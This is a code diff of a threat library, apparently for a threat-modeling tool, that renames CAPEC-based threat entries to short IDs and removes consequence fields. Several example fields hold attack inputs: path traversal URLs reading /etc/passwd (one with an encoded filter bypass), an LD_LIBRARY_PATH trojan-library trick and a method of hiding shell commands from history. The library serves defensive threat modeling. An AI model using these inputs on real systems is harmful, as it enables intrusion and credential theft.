    "condition": "target.handlesResourceConsumption is False or target.isResilient is False",
-   "Prerequisites": "Any target that services requests is vulnerable to this attack on some level of scale.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.",
+   "prerequisites": "Any target that services requests is vulnerable to this attack on some level of scale.",
    "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.",
    "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic."
  },
- "Path Traversal": {
+ "HA01": {
    "SID":"20",
    "target": Server,
    "description": "Path Traversal",
@@ -258,12 +239,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very High",
    "condition": "target.validatesInput is False and target.sanitizesInput is False",
-   "Prerequisites": "The attacker must be able to control the path that is requested of the target.The target must fail to adequately sanitize incoming paths",
-   "Consequences": "SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Confidentiality Availability Execute Unauthorized Commands The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.",
+   "prerequisites": "The attacker must be able to control the path that is requested of the target.The target must fail to adequately sanitize incoming paths",
    "mitigations": "Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.",
    "example": "An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system."
  },
- "Subverting Environment Variable Values": {
+ "AC03": {
    "SID":"21",
    "target":(Process, Lambda),
    "description": "Subverting Environment Variable Values",
@@ -271,12 +251,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very High",
    "condition": "target.usesEnvironmentVariables is True and (target.implementsAuthenticationScheme is False or target.validatesInput is False or target.authorizesSource is False)",
-   "Prerequisites": "An environment variable is accessible to the user.An environment variable used by the application can be tainted with user supplied data.Input data used in an environment variable is not validated properly.The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection MechanismSCOPE:AvailabilityTECHNICAL IMPACT:Unreliable ExecutionSCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "An environment variable is accessible to the user.An environment variable used by the application can be tainted with user supplied data.Input data used in an environment variable is not validated properly.The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.",
    "mitigations": "Protect environment variables against unauthorized read and write access. Protect the configuration files which contain environment variables against illegitimate read and write access. Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.",
    "example": "Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the attacker upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073). The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands."
  },
- "Excessive Allocation": {
+ "DO02": {
    "SID": "22",
    "target": (Process, Server, Datastore, Lambda),
    "description": "Excessive Allocation",
@@ -284,12 +263,11 @@ Threats = {
    "Likelihood Of Attack": "Medium",
    "severity": "Medium",
    "condition": "target.handlesResourceConsumption is False",
-   "Prerequisites": "The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.",
+   "prerequisites": "The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.",
    "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.",
    "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target."
  },
- "Try All Common Switches": {
+ "DS02": {
    "SID":"23",
    "target": (Lambda, Process),
    "description": "Try All Common Switches",
@@ -297,12 +275,11 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.environment == 'Production'",
-   "Prerequisites": "The attacker must be able to control the options or switches sent to the target.",
-   "Consequences": "",
+   "prerequisites": "The attacker must be able to control the options or switches sent to the target.",
    "mitigations": "Design: Minimize switch and option functionality to only that necessary for correct function of the command. Implementation: Remove all debug and testing options from production code.",
    "example": "Adversary is able to exploit the debug switch to discover unpublicized functionality."
  },
- "Format String Injection": {
+ "IN08": {
    "SID":"24",
    "target": (Lambda, Process, Server),
    "description": "Format String Injection",
@@ -310,12 +287,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.validatesInput is False or target.sanitizesInput is False",
-   "Prerequisites": "The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:Access ControlTECHNICAL IMPACT:Gain PrivilegesSCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism",
+   "prerequisites": "The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.",
    "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.",
    "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks."
  },
- "LDAP Injection": {
+ "IN09": {
    "SID": "25",
    "target": Server,
    "description": "LDAP Injection",
@@ -323,12 +299,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.validatesInput is False",
-   "Prerequisites": "The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable ExecutionSCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism",
+   "prerequisites": "The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.",
    "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.",
    "example": "PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack."
  },
- "Parameter Injection": {
+ "IN10": {
    "SID": "26",
    "target": Server,
    "description": "Parameter Injection",
@@ -336,12 +311,11 @@ Threats = {
    "Likelihood Of Attack": "Medium",
    "severity": "Medium",
    "condition": "target.validatesInput is False",
-   "Prerequisites": "The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Successful parameter injection attacks mean a compromise to integrity of the application.",
+   "prerequisites": "The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.",
    "mitigations": "Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.",
    "example": "The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed."
  },
- "Relative Path Traversal": {
+ "IN11": {
    "SID": "27",
    "target": Server,
    "description": "Relative Path Traversal",
@@ -349,12 +323,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.validatesInput is False or target.sanitizesInput is False",
-   "Prerequisites": "The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection MechanismSCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution",
+   "prerequisites": "The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.",
    "mitigations": "Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.",
    "example": "The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker."
  },
- "Client-side Injection-induced Buffer Overflow": {
+ "IN12": {
    "SID":"28",
    "target": (Lambda, Process),
    "description": "Client-side Injection-induced Buffer Overflow",
@@ -362,12 +335,11 @@ Threats = {
    "Likelihood Of Attack": "Medium",
    "severity": "High",
    "condition": "target.checksInputBounds is False and target.validatesInput is False",
-   "Prerequisites": "The targeted client software communicates with an external server.The targeted client software has a buffer overflow vulnerability.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of ServiceSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code",
+   "prerequisites": "The targeted client software communicates with an external server.The targeted client software has a buffer overflow vulnerability.",
    "mitigations": "The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.",
-   "example": "Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use <EMBED/\> tags in HTML documents. For example </EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true\|> If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild."
+   "example": "Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild."
  },
- "XML Schema Poisoning": {
+ "AC04": {
    "SID": "29",
    "target": Dataflow,
    "description": "XML Schema Poisoning",
@@ -375,12 +347,11 @@ Threats = {
    "Likelihood Of Attack": "Low",
    "severity": "High",
    "condition": "target.data == 'XML' and target.authorizesSource is False",
-   "Prerequisites": "Some level of access to modify the target schema.The schema used by the target application must be improperly secured against unauthorized modification and manipulation.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "Some level of access to modify the target schema.The schema used by the target application must be improperly secured against unauthorized modification and manipulation.",
    "mitigations": "Design: Protect the schema against unauthorized modification. Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally, ensure that the proper permissions are set on local files to avoid unauthorized modification. Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.",
    "example": "XML Schema Poisoning Attacks can often occur locally due to being embedded within the XML document itself or being located on the host within an improperaly protected file. In these cases, the adversary can simply edit the XML schema without the need for additional privileges. An example of the former can be seen below: <?xml version=1.0?> <!DOCTYPE contact [ <!ELEMENT contact (name,phone,email,address)> <!ELEMENT name (#PCDATA)> <!ELEMENT phone (#PCDATA)> <!ELEMENT email (#PCDATA)> <!ELEMENT address (#PCDATA)> ]> <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code> If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.XML Schema Poisoning Attacks can also be executed remotely if the HTTP protocol is being used to transport data. : <?xml version=1.0?> <!DOCTYPE contact SYSTEM http://example.com/contact.dtd[ <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code> The HTTP protocol does not encrypt the traffic it transports, so all communication occurs in plaintext. This traffic can be observed and modified by the adversary during transit to alter the XML schema before it reaches the end user. The adversary can perform a Man-in-the-Middle (MITM) Attack to alter the schema in the same way as the previous example and to acheive the same results."
  },
- "XML Ping of the Death": {
+ "DO03": {
    "SID": "30",
    "target": Dataflow,
    "description": "XML Ping of the Death",
@@ -388,12 +359,11 @@ Threats = {
    "Likelihood Of Attack": "Low",
    "severity": "Medium",
    "condition": "target.data == 'XML'",
-   "Prerequisites": "The target must receive and process XML transactions.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption DoS: resource consumption (other)",
+   "prerequisites": "The target must receive and process XML transactions.",
    "mitigations": "Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval. Implementation: Provide for network flow control and traffic shaping to control access to the resources.",
    "example": "Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service."
  },
- "Content Spoofing": {
+ "AC05": {
    "SID": "31",
    "target": (Process,Server),
    "description": "Content Spoofing",
@@ -401,12 +371,11 @@ Threats = {
    "Likelihood Of Attack": "Medium",
    "severity": "Medium",
    "condition": "target.providesIntegrity is False or target.authorizesSource is False",
-   "Prerequisites": "The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which he/she is not authorized.If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful content spoofing attack compromises the integrity of the application data.",
-   "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application. Use of POST parameter if possible.",
+   "prerequisites": "The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which he/she is not authorized.If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.",
+   "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.",
    "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server."
  },
- "Command Delimiters": {
+ "IN13": {
    "SID": "32",
    "target": (Lambda, Process),
    "description": "Command Delimiters",
@@ -414,12 +383,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.validatesInput is False",
-   "Prerequisites": "Software's input validation or filtering must not detect and block presence of additional malicious command.",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "Software's input validation or filtering must not detect and block presence of additional malicious command.",
    "mitigations": "Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.",
    "example": "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database."
  },
- "Input Data Manipulation": {
+ "IN14": {
    "SID": "33",
    "target": (Process, Lambda, Server),
    "description": "Input Data Manipulation",
@@ -427,25 +395,23 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.validatesInput is False",
-   "Prerequisites": "The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.",
-   "Consequences": "",
+   "prerequisites": "The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.",
    "mitigations": "Validation of user input for type, length, data-range, format, etc.",
    "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values." 
  },
- "Sniffing Attacks": {
+ "DE03": {
    "SID": "34",
    "target": Dataflow,
    "description": "Sniffing Attacks",
    "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.",
    "Likelihood Of Attack": "",
    "severity": "Medium",
-   "condition": "target.protocol == 'HTTP' or target.isEncrypted is False or target.usesVPN is False",
-   "Prerequisites": "The target data stream must be transmitted on a medium to which the adversary has access.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "condition": "(target.protocol == 'HTTP' or target.isEncrypted is False) or target.usesVPN is False",
+   "prerequisites": "The target data stream must be transmitted on a medium to which the adversary has access.",
    "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.",
    "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code."
  },
- "Dictionary-based Password Attack": {
+ "CR03": {
    "SID":"35",
    "target": (Process, Server),
    "description": "Dictionary-based Password Attack",
@@ -453,12 +419,11 @@ Threats = {
    "Likelihood Of Attack": "Medium",
    "severity": "High",
    "condition": "target.implementsAuthenticationScheme is False",
-   "Prerequisites": "The system uses one factor password based authentication.The system does not have a sound password policy that is being enforced.The system does not implement an effective password throttling mechanism.",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges",
+   "prerequisites": "The system uses one factor password based authentication.The system does not have a sound password policy that is being enforced.The system does not implement an effective password throttling mechanism.",
    "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.",
    "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096"
  },
- "Exploit Script-Based APIs": {
+ "API02": {
    "SID":"36",
    "target": (Process, Lambda),
    "description": "Exploit Script-Based APIs",
@@ -466,25 +431,23 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.implementsAPI is True and target.validatesInput is False",
-   "Prerequisites": "The target application must include the use of APIs that execute scripts.The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.",
-   "Consequences": "",
+   "prerequisites": "The target application must include the use of APIs that execute scripts.The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.",
    "mitigations": "Always use HTTPS and SSL Certificates. Firewall optimizations to prevent unauthorized access to or from a private network. Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API. Use IP whitelisting and rate limiting.",
    "example": "Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc."
  },
- "White Box Reverse Engineering": {
+ "HA02": {
    "SID": "37",
    "target": ExternalEntity,
    "description": "White Box Reverse Engineering",
    "details": "An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.",
    "Likelihood Of Attack": "",
    "severity": "Medium",
-   "condition": "target.hasphysicalAccess is True",
-   "Prerequisites": "Direct access to the object or software.",
-   "Consequences": "",
+   "condition": "target.hasPhysicalAccess is True",
+   "prerequisites": "Direct access to the object or software.",
    "mitigations": "Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.",
    "example": "Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files."
  },
- "Footprinting": {
+ "DS03": {
    "SID": "38",
    "target": Server,
    "description": "Footprinting",
@@ -492,12 +455,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very Low",
    "condition":"target.isHardened is False",
-   "Prerequisites": "An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.",
    "mitigations": "Keep patches up to date by installing weekly or daily if possible.Shut down unnecessary services/ports.Change default passwords by choosing strong passwords.Curtail unexpected input.Encrypt and password-protect sensitive data.Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.",
    "example": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates 